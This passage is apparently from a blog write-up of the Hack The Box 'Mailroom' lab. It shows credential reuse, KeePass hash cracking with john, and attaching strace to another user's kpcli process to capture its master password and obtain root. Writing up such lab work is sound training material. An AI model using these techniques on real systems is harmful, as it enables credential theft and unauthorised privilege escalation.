+</span></span></code></pre></div><p>Although the credentials seem to be invalid on Gitea, there&rsquo;s an interesting nuance with the URL encoding. The <code>%23</code> is URL-encoded and translates to a <code>#</code> symbol. Consequently, Gitea accepts the credentials <code>matthew:HueLover83#</code>. These same credentials are also reused on <code>matthew</code>&rsquo;s local account.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> tristan@mailroom:/dev/shm$ su matthew
+</span></span><span class="line"><span class="cl">Password:
+</span></span><span class="line"><span class="cl">matthew@mailroom:/dev/shm$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>matthew<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>matthew<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>matthew<span class="o">)</span>
+</span></span><span class="line"><span class="cl">matthew@mailroom:/dev/shm$ <span class="nb">cd</span>
+</span></span><span class="line"><span class="cl">matthew@mailroom:~$ ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">32</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> matthew matthew <span class="m">4096</span> Jul <span class="m">19</span> 14:40 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">4</span> root    root    <span class="m">4096</span> Jan <span class="m">15</span>  <span class="m">2023</span> ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> matthew matthew    <span class="m">9</span> Jan <span class="m">15</span>  <span class="m">2023</span> .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> matthew matthew  <span class="m">220</span> Jan <span class="m">15</span>  <span class="m">2023</span> .bash_logout
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> matthew matthew <span class="m">3771</span> Jan <span class="m">15</span>  <span class="m">2023</span> .bashrc
+</span></span><span class="line"><span class="cl">drwx------ <span class="m">2</span> matthew matthew <span class="m">4096</span> Jan <span class="m">15</span>  <span class="m">2023</span> .cache
+</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> root    root       <span class="m">9</span> Jan <span class="m">15</span>  <span class="m">2023</span> .kpcli-history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> matthew matthew <span class="m">1998</span> Mar <span class="m">16</span> 22:47 personal.kdbx
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> matthew matthew  <span class="m">807</span> Jan <span class="m">15</span>  <span class="m">2023</span> .profile
+</span></span><span class="line"><span class="cl">-rw-r----- <span class="m">1</span> root    matthew   <span class="m">33</span> Jul <span class="m">19</span> 12:29 user.txt
+</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> matthew matthew    <span class="m">9</span> Jan <span class="m">15</span>  <span class="m">2023</span> .viminfo -&gt; /dev/null
+</span></span></code></pre></div><hr>
+<h2 id="privilege-escalation-to-root" class="relative group">Privilege Escalation to root <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#privilege-escalation-to-root" aria-label="Anchor">#</a></span></h2><hr>
+<p>The user <code>matthew</code> also lacks sudo privileges.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> matthew@mailroom:/home/matthew$ sudo -l
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> matthew:
+</span></span><span class="line"><span class="cl">Sorry, user matthew may not run sudo on mailroom.
+</span></span></code></pre></div><p>Interestingly, a <code>keepass</code> database is present in the home directory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; file personal.kdbx
+</span></span><span class="line"><span class="cl">personal.kdbx: Keepass password database 2.x KDBX
+</span></span></code></pre></div><p>However, I cannot open the database, it needs a master password
+Created a hash using <code>keepass2john</code>, but can&rsquo;t crack it with <code>rockyou</code> as the wordlist</p>
+<p>Nonetheless, accessing the database requires a master password. In an attempt to crack the password, created a hash using <code>keepass2john</code>, but the password isn&rsquo;t found within the <code>rockyou.txt</code> wordlist.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; keepass2john personal.kdbx &gt; keepass_hash.txt
+</span></span><span class="line"><span class="cl">&gt; john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt keepass_hash.txt
+</span></span></code></pre></div><p>With nothing else left, ran <code>pspy</code> to look for background processes and found <code>kpcli</code>. It appears that <code>matthew</code> (UID 1001) is executing the <code>kpcli</code> script.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">2023/07/19 16:19:32 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">1001</span>  <span class="nv">PID</span><span class="o">=</span><span class="m">79331</span>  <span class="p">|</span> -bash -c /usr/bin/kpcli
+</span></span><span class="line"><span class="cl">2023/07/19 16:19:32 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">1001</span>  <span class="nv">PID</span><span class="o">=</span><span class="m">79332</span>  <span class="p">|</span> /usr/bin/locale-check C.UTF-8
+</span></span><span class="line"><span class="cl">2023/07/19 16:19:32 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">1001</span>  <span class="nv">PID</span><span class="o">=</span><span class="m">79333</span>  <span class="p">|</span> /usr/bin/perl /usr/bin/kpcli
+</span></span></code></pre></div><p>It seems that <code>kpcli</code> is a Perl script owned by the root user. It seems to be a CLI program for managing Keepass databases.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> matthew@mailroom:/home/matthew$ file /usr/bin/kpcli
+</span></span><span class="line"><span class="cl">/usr/bin/kpcli: Perl script text executable
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> matthew@mailroom:/home/matthew$ ls -la /usr/bin/kpcli
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">193792</span> Aug <span class="m">21</span>  <span class="m">2016</span> /usr/bin/kpcli
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> matthew@mailroom:/home/matthew$ cat /usr/bin/kpcli
+</span></span><span class="line"><span class="cl"><span class="c1">#!/usr/bin/perl</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">###########################################################################</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># kpcli - KeePass Command Line Interface</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Author: Lester Hightower &lt;hightowe at cpan dot org&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># This program was inspired by &#34;kedpm -c&#34; and resulted despite illness</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># (or more likely because of it) over the USA Thanksgiving holiday in</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># late November of 2010. As a long-time user of the Ked Password Manager</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># I really missed a command line interface after getting an Android cell</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># phone and switching to KeePass, so that I could access my password</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># database on my phone. This program scratches that itch.</span>
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></div><p>The import command requires two arguments: the database name and the path to the directory containing the database file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> matthew@mailroom:/home/matthew$ /usr/bin/perl /usr/bin/kpcli
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">kpcli:/&gt; import personal.kdbx /home/matthew
+</span></span><span class="line"><span class="cl">Please provide the master password: *************************
+</span></span><span class="line"><span class="cl">Couldn<span class="err">&#39;</span>t load the file personal.kdbx: The database key appears invalid or <span class="k">else</span> the database is corrupt
+</span></span></code></pre></div><p>Importing the database is currently not possible. However, a viable approach is to use <code>strace</code> by attaching to the process&rsquo;s PID. This will enable monitoring of the system calls being made by the process. Given that someone is already utilizing the <code>kpcli</code> script as the user <code>matthew</code>, this can return interesting information.</p>
+<p>To handle the changing PIDs for the script, this one-liner grabs the current process ID for the active <code>kpcli</code> process.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">matthew@mailroom:~$ ps aux <span class="p">|</span> grep <span class="s1">&#39;[k]pcli&#39;</span> <span class="p">|</span> awk <span class="s1">&#39;{ print $2 }&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="m">93776</span>
+</span></span></code></pre></div><p>The script needs a master password for successful execution, so I am more interested in successful read sys calls
+Flags for strace</p>
+<ul>
+<li><code>-p</code> attach to a PID</li>
+<li><code>-e trace=read</code> only show read syscalls</li>
+<li><code>-f</code> follow any forked processes</li>
+<li><code>-o</code> output file</li>
+</ul>
+<p>The script requires a master password for successful execution, this means successful <code>sysread</code> calls could give interesting information. The relevant strace flags are:</p>
+<ul>
+<li><code>-p</code>: Attach to a specific PID.</li>
+<li><code>-e trace=read</code>: Display only read syscalls.</li>
+<li><code>-f</code>: Follow any forked processes.</li>
+<li><code>-o</code>: Define the output file for the trace.</li>
+</ul>
+<p>The final command to attach the currently running <code>kpcli</code> process to <code>strace</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">matthew@mailroom:~$ strace -f -p <span class="k">$(</span>ps aux <span class="p">|</span> grep <span class="s1">&#39;[k]pcli&#39;</span> <span class="p">|</span> awk <span class="s1">&#39;{ print $2 }&#39;</span><span class="k">)</span> -e <span class="nv">trace</span><span class="o">=</span><span class="nb">read</span> -o kpcli.log
+</span></span><span class="line"><span class="cl">strace: Process <span class="m">93785</span> attached
+</span></span></code></pre></div><p>By filtering for successful read syscalls (e.g., <code>read() = 1</code>), numerous entries like <code>-1 Resource temporarily unavailable</code> can be avoided, since they don&rsquo;t provide much useful information.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> matthew@mailroom:/home/matthew$ cat kpcli.log <span class="p">|</span> grep <span class="s1">&#39;= 1$&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="m">93785</span> read<span class="o">(</span>3, <span class="s2">&#34;.&#34;</span>, 1<span class="o">)</span>                   <span class="o">=</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="m">93785</span> read<span class="o">(</span>3, <span class="s2">&#34;k&#34;</span>, 1<span class="o">)</span>                   <span class="o">=</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="m">93785</span> read<span class="o">(</span>3, <span class="s2">&#34;d&#34;</span>, 1<span class="o">)</span>                   <span class="o">=</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl"><span class="m">93785</span> read<span class="o">(</span>3, <span class="s2">&#34;t&#34;</span>, 1<span class="o">)</span>                   <span class="o">=</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="m">93785</span> read<span class="o">(</span>3, <span class="s2">&#34;\n&#34;</span>, 1<span class="o">)</span>                  <span class="o">=</span> <span class="m">1</span>
+</span></span></code></pre></div><p>With some bash fu the required characters can be selectively extracted in one line. Additionally, newline characters can be managed using <code>sed</code> to display actual line breaks, effectively delineating the inputs.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> matthew@mailroom:/home/matthew$ cat kpcli.log <span class="p">|</span> grep <span class="s1">&#39;= 1$&#39;</span> <span class="p">|</span> cut -d<span class="s1">&#39;&#34;&#39;</span> -f2 <span class="p">|</span> tr -d <span class="s1">&#39;\n&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/\\n/\n/g&#39;</span>
+</span></span><span class="line"><span class="cl">.kdbx
+</span></span><span class="line"><span class="cl">!sEcUr3p4<span class="nv">$$</span>w01<span class="se">\1</span>0rd9
+</span></span><span class="line"><span class="cl">ls Root/
+</span></span><span class="line"><span class="cl">show -f <span class="m">0</span>
+</span></span><span class="line"><span class="cl">quit
+</span></span></code></pre></div><p>Even though <code>!sEcUr3p4$$w01\10rd9</code> might seem like the password, it&rsquo;s invalid. The <code>\10</code> portion appears unusual, considering that other entries are in ASCII format.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="m">93785</span> read<span class="o">(</span>0, <span class="s2">&#34;w&#34;</span>, 8192<span class="o">)</span>                <span class="o">=</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="m">93785</span> read<span class="o">(</span>0, <span class="s2">&#34;0&#34;</span>, 8192<span class="o">)</span>                <span class="o">=</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="m">93785</span> read<span class="o">(</span>0, <span class="s2">&#34;1&#34;</span>, 8192<span class="o">)</span>                <span class="o">=</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="m">93785</span> read<span class="o">(</span>0, <span class="s2">&#34;\10&#34;</span>, 8192<span class="o">)</span>              <span class="o">=</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="m">93785</span> read<span class="o">(</span>0, <span class="s2">&#34;r&#34;</span>, 8192<span class="o">)</span>                <span class="o">=</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="m">93785</span> read<span class="o">(</span>0, <span class="s2">&#34;d&#34;</span>, 8192<span class="o">)</span>                <span class="o">=</span> <span class="m">1</span>
+</span></span></code></pre></div><p>The <code>\10</code> looks like octal, and since <code>strace</code> is supposed to prints ASCII chars, there should be a connection. Octal <code>10</code> corresponds to a backspace in the ASCII chart</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/ascii-conversion-chart.png" alt="Octal to ASCII chart" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>This means that after removing the <code>1</code>, the password <code>!sEcUr3p4$$w01\10rd9</code> becomes <code>!sEcUr3p4$$w0rd9</code>. By using the master password, it was possible to decrypt the database and uncover the root&rsquo;s password within one of those entries.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> matthew@mailroom:/home/matthew$ kpcli --kdb personal.kdbx
+</span></span><span class="line"><span class="cl">Please provide the master password: *************************
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">KeePass CLI <span class="o">(</span>kpcli<span class="o">)</span> v3.1 is ready <span class="k">for</span> operation.
+</span></span><span class="line"><span class="cl">Type <span class="s1">&#39;help&#39;</span> <span class="k">for</span> a description of available commands.
+</span></span><span class="line"><span class="cl">Type <span class="s1">&#39;help &lt;command&gt;&#39;</span> <span class="k">for</span> details on individual commands.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">kpcli:/&gt; ls Root/
+</span></span><span class="line"><span class="cl"><span class="o">===</span> <span class="nv">Entries</span> <span class="o">===</span>
+</span></span><span class="line"><span class="cl">0. food account                                            door.dash.local
+</span></span><span class="line"><span class="cl">1. GItea Admin account                                    git.mailroom.htb
+</span></span><span class="line"><span class="cl">2. gitea database password
+</span></span><span class="line"><span class="cl">3. My Gitea Account                                       git.mailroom.htb
+</span></span><span class="line"><span class="cl">4. root acc
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">kpcli:/&gt; show -f <span class="m">4</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Title: root acc
+</span></span><span class="line"><span class="cl">Uname: root
+</span></span><span class="line"><span class="cl"> Pass: a<span class="nv">$gBa3</span>!GA8
+</span></span><span class="line"><span class="cl">  URL:
+</span></span><span class="line"><span class="cl">Notes: root account <span class="k">for</span> sysadmin <span class="nb">jobs</span>
+</span></span></code></pre></div><p>Pwned!!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">matthew@mailroom:~$ su root
+</span></span><span class="line"><span class="cl">Password:
+</span></span><span class="line"><span class="cl">root@mailroom:/home/matthew# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@mailroom:/home/matthew# ls -la /root/root.txt
+</span></span><span class="line"><span class="cl">-rw-r----- <span class="m">1</span> root root <span class="m">33</span> Jul <span class="m">19</span> 12:29 /root/root.txt
+</span></span><span class="line"><span class="cl">root@mailroom:/home/matthew#
+</span></span></code></pre></div><!-- ![Pwned Mailroom](https://i.imgur.com/TfQTGlQ.png) -->
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+
+      
+  
+  <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
+    
+      
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://twitter.com/intent/tweet/?url=//localhost:1313/blog/20230821-htb-mailroom/&amp;text=HTB%20Mailroom"
+          title="Tweet on Twitter"
+          aria-label="Tweet on Twitter"
+          target="_blank"
+          rel="noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://www.linkedin.com/shareArticle?mini=true&amp;url=//localhost:1313/blog/20230821-htb-mailroom/&amp;title=HTB%20Mailroom"
+          title="Share on LinkedIn"
+          aria-label="Share on LinkedIn"
+          target="_blank"
+          rel="noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://reddit.com/submit/?url=//localhost:1313/blog/20230821-htb-mailroom/&amp;resubmit=true&amp;title=HTB%20Mailroom"
+          title="Submit to Reddit"
+          aria-label="Submit to Reddit"
+          target="_blank"
+          rel="noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z"/></svg>
+</span></a
+        >
+      
+    
+  </section>
+
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="/blog/hello-world/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Hello World</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2023-06-21 23:12:21 &#43;0530 IST">21 June 2023</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="group flex text-right" href="/blog/20230825-htb-onlyforyou/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >HTB OnlyForYou</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2023-08-27 23:01:23 &#43;0530 IST">27 August 2023</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&rarr;</span
+                ><span class="ltr:hidden rtl:inline">&larr;</span></span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+        
+          <div class="pt-3">
+            <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+            <div class="pt-3">
+              <script
+    src="https://giscus.app/client.js"
+    data-repo="AbraXa5/personal-blog"
+    data-repo-id="R_kgDOJxB9Aw"
+    data-category="Q&A"
+    data-category-id="DIC_kwDOJxB9A84CXU6d"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="dark_dimmed"
+    data-lang="en"
+    data-loading="lazy"
+    crossorigin="anonymous"
+    async
+></script>
+
+            </div>
+          </div>
+        
+      
+    </footer>
+  </article>
+
+        
+          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
+            <a
+              href="#the-top"
+              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+              aria-label="Scroll to top"
+              title="Scroll to top"
+            >
+              &uarr;
+            </a>
+          </div>
+        
+      </main><footer class="py-10 print:hidden">
+  
+  
+    <nav class="pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
+      <ul class="flex list-none flex-col sm:flex-row">
+        
+          
+          <li class="group mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0">
+            
+              <a
+                href="https://www.buymeacoffee.com/abr4xa5"
+                title=""
+                target="_blank"
+                >
+                  <span
+                    class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
+                  ><span class="icon relative inline-block px-1 align-text-bottom"><svg width="884" height="1279" viewBox="0 0 884 1279" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <path d="M791.109 297.518L790.231 297.002L788.201 296.383C789.018 297.072 790.04 297.472 791.109 297.518V297.518Z"
+        fill="#0D0C22" />
+    <path d="M803.896 388.891L802.916 389.166L803.896 388.891Z" fill="#0D0C22" />
+    <path
+        d="M791.484 297.377C791.359 297.361 791.237 297.332 791.118 297.29C791.111 297.371 791.111 297.453 791.118 297.534C791.252 297.516 791.379 297.462 791.484 297.377V297.377Z"
+        fill="#0D0C22" />
+    <path d="M791.113 297.529H791.244V297.447L791.113 297.529Z" fill="#0D0C22" />
+    <path
+        d="M803.111 388.726L804.591 387.883L805.142 387.573L805.641 387.04C804.702 387.444 803.846 388.016 803.111 388.726V388.726Z"
+        fill="#0D0C22" />
+    <path d="M793.669 299.515L792.223 298.138L791.243 297.605C791.77 298.535 792.641 299.221 793.669 299.515V299.515Z"
+        fill="#0D0C22" />
+    <path
+        d="M430.019 1186.18C428.864 1186.68 427.852 1187.46 427.076 1188.45L427.988 1187.87C428.608 1187.3 429.485 1186.63 430.019 1186.18Z"
+        fill="#0D0C22" />
+    <path
+        d="M641.187 1144.63C641.187 1143.33 640.551 1143.57 640.705 1148.21C640.705 1147.84 640.86 1147.46 640.929 1147.1C641.015 1146.27 641.084 1145.46 641.187 1144.63Z"
+        fill="#0D0C22" />
+    <path
+        d="M619.284 1186.18C618.129 1186.68 617.118 1187.46 616.342 1188.45L617.254 1187.87C617.873 1187.3 618.751 1186.63 619.284 1186.18Z"
+        fill="#0D0C22" />
+    <path
+        d="M281.304 1196.06C280.427 1195.3 279.354 1194.8 278.207 1194.61C279.136 1195.06 280.065 1195.51 280.684 1195.85L281.304 1196.06Z"
+        fill="#0D0C22" />
+    <path
+        d="M247.841 1164.01C247.704 1162.66 247.288 1161.35 246.619 1160.16C247.093 1161.39 247.489 1162.66 247.806 1163.94L247.841 1164.01Z"
+        fill="#0D0C22" />
+    <path
+        d="M472.623 590.836C426.682 610.503 374.546 632.802 306.976 632.802C278.71 632.746 250.58 628.868 223.353 621.274L270.086 1101.08C271.74 1121.13 280.876 1139.83 295.679 1153.46C310.482 1167.09 329.87 1174.65 349.992 1174.65C349.992 1174.65 416.254 1178.09 438.365 1178.09C462.161 1178.09 533.516 1174.65 533.516 1174.65C553.636 1174.65 573.019 1167.08 587.819 1153.45C602.619 1139.82 611.752 1121.13 613.406 1101.08L663.459 570.876C641.091 563.237 618.516 558.161 593.068 558.161C549.054 558.144 513.591 573.303 472.623 590.836Z"
+        fill="#FFDD00" />
+    <path d="M78.6885 386.132L79.4799 386.872L79.9962 387.182C79.5987 386.787 79.1603 386.435 78.6885 386.132V386.132Z"
+        fill="#0D0C22" />
+    <path
